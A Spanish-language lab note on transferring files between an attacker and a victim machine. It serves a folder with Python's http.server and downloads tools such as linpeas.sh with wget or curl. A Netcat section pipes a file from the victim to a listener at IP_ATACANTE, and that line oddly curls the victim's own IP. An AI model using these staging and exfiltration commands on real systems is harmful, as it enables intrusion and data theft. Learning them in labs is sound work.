> [!info] Idea principal
> Para pasar archivos desde la **maquina atacante** hacia la **maquina victima**, puedo montar un servidor HTTP rapido con Python y descargar los archivos desde la victima.

## Para que Sirve

Este metodo es muy util en laboratorios de hacking cuando necesito transferir:

- Scripts.
- Exploits.
- Herramientas.
- Archivos de prueba.
- Payloads.

La idea es sencilla:

> [!example] Flujo basico
> 1. En la maquina atacante dejo el archivo en una carpeta.
> 2. Desde esa carpeta levanto un servidor HTTP con Python.
> 3. En la maquina victima descargo el archivo usando navegador, `wget` o `curl`.

## Paso 1: Ir a la Carpeta del Archivo

Primero debo colocarme en la carpeta donde esta el archivo que quiero compartir:

```bash
cd /ruta/del/archivo
```

Por ejemplo:

```bash
cd /home/kali/tools
```

## Paso 2: Montar el Servidor HTTP

En la maquina atacante ejecuto:

```bash
python3 -m http.server 80
```

Esto levanta un servidor web en el puerto `80`.

> [!tip] Puerto alternativo
> Si el puerto `80` no funciona o requiere permisos, puedo usar otro puerto como `8000`:
>
> ```bash
> python3 -m http.server 8000
> ```

## Paso 3: Descargar desde la Maquina Victima

Desde la maquina victima puedo descargar el archivo de varias formas.

### Opcion 1: Usando el Navegador

Abrir en el navegador:

```text
http://IP_ATACANTE/
```

Ejemplo:

```text
http://10.10.10.10/
```

Desde ahi puedo ver los archivos disponibles y descargarlos.

### Opcion 2: Usando wget

```bash
wget http://IP_ATACANTE/archivo
```

Ejemplo:

```bash
wget http://10.10.10.10/linpeas.sh
```

### Opcion 3: Usando curl

```bash
curl http://IP_ATACANTE/archivo -o archivo
```

Ejemplo:

```bash
curl http://10.10.10.10/linpeas.sh -o linpeas.sh
```

## Ejemplo Completo

En la maquina atacante:

```bash
cd /home/kali/tools
python3 -m http.server 80
```

En la maquina victima:

```bash
wget http://10.10.10.10/linpeas.sh
```

## Descargar Archivos hacia Netcat

Tambien se puede combinar `curl` con Netcat en algunos casos para enviar contenido hacia una conexion en escucha.

En la maquina atacante:

```bash
nc -nlvp 9001 > archivo_recibido
```

En la maquina victima:

```bash
curl http://IP_VICTIMA/archivo | nc IP_ATACANTE 9001
```

> [!warning] Nota
> Normalmente, para transferencias simples, es mas facil usar `python3 -m http.server` junto con `wget` o `curl`.

## Checklist Rapido

- [ ] Estar en la carpeta donde esta el archivo a compartir.
- [ ] Levantar el servidor HTTP con Python.
- [ ] Confirmar la IP de la maquina atacante.
- [ ] Descargar el archivo desde la maquina victima.
- [ ] Comprobar que el archivo se ha descargado correctamente.
